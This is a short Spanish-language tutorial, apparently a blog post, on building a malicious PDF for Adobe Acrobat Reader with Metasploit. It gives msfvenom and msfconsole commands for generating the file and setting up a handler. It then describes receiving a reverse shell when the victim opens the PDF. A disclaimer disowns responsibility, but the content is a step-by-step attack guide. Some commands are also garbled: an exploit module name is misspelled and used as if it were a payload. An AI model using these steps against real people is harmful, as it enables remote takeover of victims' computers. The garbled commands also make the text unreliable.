Cómo crear un pdf malicioso para adobe acrobat.



En este artículo aprenderemos a como hacer un pdf malicioso con metasploit para adobe acrobar reader.



Primero quiero aclarar que no recomiendo usar metasploit y que no me hago responsable de el uso que le podáis dar a la información redactada en este artículo.

1-Crear el pdf con msfvenom.

Para hacerlo tenemos que ejecutar el siguiente comando:

msfvenom -p windows/fileformat/adobe_pdf_embbeded_exe -f pdf lhost=HOST lport=PORT -o file_name.pdf


Recordad que debéis sustituir las cosas en mayúsculas por vuestros datos.

2-Iniciar la consola de metasploit.

Para ello simplemente ejecutamos el siguiente comando: msfconsole -q

3-Setear el exploit.

Para ello ejecutamos el siguiente comando: use exploit/multi/handler

4-Setear el payload.

Para ello ejecutamos el siguiente comando: set payload windows/fileformat/adobe_pdf_embbeded_exe

5-Setear las opciones.

Para ello debemos ejecutar los siguientes comandos:

set lport PORT y set lhost HOST

6-Iniciar el exploit.

Para ello ejecutamos lo siguiente: exploit o run


Y cuando la víctima ejecute el pdf nos llegará una reverse shell con los payloads por defecto de metasploit, para ver las opciones puedes poner help y para ganar una consola interactiva puedes ejecutar el comando shell.
